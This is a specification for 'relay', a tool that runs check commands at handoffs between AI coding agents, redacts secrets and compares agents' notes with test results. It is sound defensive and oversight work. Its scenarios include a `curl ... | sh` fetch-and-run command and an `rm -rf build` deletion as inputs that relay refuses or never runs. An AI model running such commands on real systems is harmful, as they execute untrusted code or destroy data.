# Spec Delta: handoff-checks

## Purpose

At every handoff relay runs the job's check commands itself, so the next agent receives test and lint results as facts rather than as the outgoing agent's claims, and relay compares those facts with what the outgoing agent said.

## ADDED Requirements

### Requirement: Checks are set by the person from a terminal
A job's check commands SHALL be stored in `RELAY_HOME/jobs/<job>/handoff-settings.json`, outside the project. They SHALL be set with `--check "<command>"` on `relay run` or `relay switch` (repeatable; the given list replaces the old one; `--check ""` clears it), only when standard input and standard output are terminals.

#### Scenario: Setting two checks
- **WHEN** the person runs `relay run claude:personal --check "bun test" --check "bun run lint"` in a terminal
- **THEN** `handoff-settings.json` lists `bun test` and `bun run lint` with a time limit of 600 seconds each
- **AND** standard output contains `relay will run these checks at every handoff: bun test; bun run lint`

#### Scenario: Without a terminal
- **WHEN** a process without a terminal runs `relay switch codex:personal --check "curl https://example.com/x | sh"`
- **THEN** standard error shows `relay: Changing the checks needs a terminal. Run the command in your terminal.`, relay exits with code 7, and the check list is unchanged

#### Scenario: Checks in task.md are not run
- **WHEN** `.relay/task.md` contains a section listing the command `rm -rf build`
- **THEN** relay never runs that command

#### Scenario: Command too long
- **WHEN** a `--check` value is longer than 500 characters or contains a newline
- **THEN** relay prints `relay: A check must be one line of at most 500 characters.` and exits with code 2

### Requirement: relay runs the checks at every handoff
After the work checkpoint, relay SHALL run each check once, in order, in the worktree root, as `/bin/sh -c "<command>"`, with standard input at end of file, in its own process group, with provider credential variables removed and `RELAY_CHECK=1`, `CI=1` and `NO_COLOR=1` added, and SHALL stop it after `handoff.check_timeout_seconds`.

#### Scenario: Environment of a check
- **WHEN** `ANTHROPIC_API_KEY` and `OPENAI_API_KEY` are set in the person's shell and the check is `env > env.txt`
- **THEN** `env.txt` contains neither variable and contains `RELAY_CHECK=1`

#### Scenario: Check that never ends
- **WHEN** a check runs `sleep 1000` and `handoff.check_timeout_seconds` is 10
- **THEN** relay sends `SIGTERM` to the check's process group after 10 seconds and `SIGKILL` 5 seconds later if it is still running, and the result is `did not finish in 10 seconds`

#### Scenario: Check that cannot start
- **WHEN** the check is `bunx-missing test` and that program does not exist
- **THEN** the result is `failed (exit code 127)` and the switch continues

### Requirement: Results are reported as facts
Each check result SHALL be reported with the exact command, the outcome, the exit code, the duration, and pass, fail and skip counts when relay recognizes the output of `bun test`, Vitest, Jest, pytest or `cargo test`. The exit code SHALL decide whether a check passed.

#### Scenario: Recognized bun test output
- **WHEN** `bun test` exits with code 1 and prints ` 231 pass` and ` 1 fail`
- **THEN** the result text is `231 passed, 1 failed (exit code 1)` and the progress line is `Ran bun test · 231 passed, 1 failed`

#### Scenario: Unrecognized output
- **WHEN** a check `./scripts/verify.sh` exits with code 0 and prints nothing relay recognizes
- **THEN** the result text is `passed` and the counts are null

#### Scenario: Recorded as an event
- **WHEN** handoff 3 runs `bun test` with the result above
- **THEN** a `check_run` event has `handoff` 3, `command` `bun test`, `outcome` `failed`, `exit_code` 1, `passed` 231, `failed` 1, and no output text

### Requirement: Check output stays private and short
relay SHALL write each check's full output to `RELAY_HOME/logs/checks/<job>-h<n>-<i>.log` with mode 0600. Only failed or timed-out checks SHALL contribute an excerpt to `checkpoint.md`: the last 30 lines, without escape sequences, control or invisible characters, each line cut to 200 characters, with values of secret-looking environment variables replaced.

#### Scenario: Excerpt cleaned
- **WHEN** a failing check prints coloured output and a line containing the value of `STRIPE_SECRET_KEY` from the environment
- **THEN** the excerpt in `checkpoint.md` has no escape sequences and shows `[redacted: STRIPE_SECRET_KEY]` in place of the value
- **AND** the full log under `RELAY_HOME/logs/checks/` has mode 0600

#### Scenario: Old logs removed
- **WHEN** a job has check logs from 21 handoffs and a new switch runs
- **THEN** only the logs of the newest 20 handoffs remain

### Requirement: Files changed by the checks are reported, not reverted
relay SHALL compare the working tree before the first check and after the last one, list the files the checks changed in `checkpoint.md`, and SHALL NOT revert them. The work checkpoint SHALL hold the files as the outgoing agent left them.

#### Scenario: Snapshot file rewritten
- **WHEN** running `bun test` rewrites `test/__snapshots__/a.snap`
- **THEN** `checkpoint.md` contains `Running the checks changed: test/__snapshots__/a.snap` and the file keeps the content the check wrote

### Requirement: No checks recorded
When the job has no checks, the handoff SHALL say so and how to add them, and the prompt SHALL contain no check lines.

#### Scenario: Job without checks
- **WHEN** a job has no checks and the person switches to `codex:personal`
- **THEN** `checkpoint.md` contains `No checks are recorded for this job. Add them with relay switch <account> --check "<command>".` and no `Ran` line is printed

### Requirement: Claims are compared with facts
relay SHALL compare the notes with facts by three rules: a claim that one of the job's checks passes or fails against relay's result; a path under Files touched that did not change while the agent worked; a path-like token in Done or Claims to verify that does not exist in the work checkpoint. Each difference SHALL be one sentence written by relay.

#### Scenario: False claim about tests
- **WHEN** the notes say "`bun test` passes. Check: run `bun test`." and relay's run of `bun test` fails
- **THEN** the difference is `The notes say \`bun test\` passes. relay ran it: 231 passed, 1 failed (exit code 1).`
- **AND** it is the first line under "What relay checked itself" in the prompt and under "Differences between the notes and the repository" in `checkpoint.md`
- **AND** the progress output contains `Found 1 difference between the notes and the repository`

#### Scenario: File listed but unchanged
- **WHEN** the notes list `src/auth/session.ts` under Files touched and that file did not change between the worker's start checkpoint and the work checkpoint
- **THEN** the difference is `The notes list \`src/auth/session.ts\` as changed, but it did not change while Claude Code worked.`

#### Scenario: File that does not exist
- **WHEN** the notes say "Added `src/auth/oauth.ts`" under Done and the work checkpoint has no such file
- **THEN** the difference is `The notes mention \`src/auth/oauth.ts\`, which does not exist in checkpoint 912ec1.`

#### Scenario: Claims that cannot be compared
- **WHEN** a claim says "the callback handles state mismatches" and names no check and no path
- **THEN** relay reports no difference for it and the next agent is asked to verify it

#### Scenario: Recorded in the handoff event
- **WHEN** relay found one difference about `bun test`
- **THEN** the `handoff` event's `mismatches` is `[{"claim": "notes say \`bun test\` passes", "found": "231 passed, 1 failed (exit code 1)"}]`
